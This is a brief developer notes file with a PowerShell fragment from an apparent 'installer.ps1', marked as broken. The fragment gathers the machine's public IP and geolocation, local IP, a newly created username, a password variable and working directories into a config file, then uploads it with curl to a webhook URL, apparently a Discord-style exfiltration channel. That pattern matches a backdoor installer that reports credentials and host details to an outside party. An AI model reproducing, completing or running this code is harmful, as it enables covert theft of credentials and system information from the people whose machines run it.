## Notes

- Fix installer.ps1
```
# broke
$RIP1 = Invoke-RestMethod -UseBasicParsing -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/ip").Content)
$CONFIG = "$WORKPATH\new.cfg"

Add-Content -Path $CONFIG -Value "$STARTDIR"
Add-Content -Path $CONFIG -Value "$LIP"
Add-Content -Path $CONFIG -Value "$RIP1"
Add-Content -Path $CONFIG -Value "$RIP2"
Add-Content -Path $CONFIG -Value "$NEWUSER"
Add-Content -Path $CONFIG -Value "$LPWORD"
Add-Content -Path $CONFIG -Value "$WORKDIR"

curl.exe -F "payload_json={\`"username\`": \`"$USERNAME\`", \`"content\`": \`"download me\`"}" -F "file=@new.cfg" $WURL
```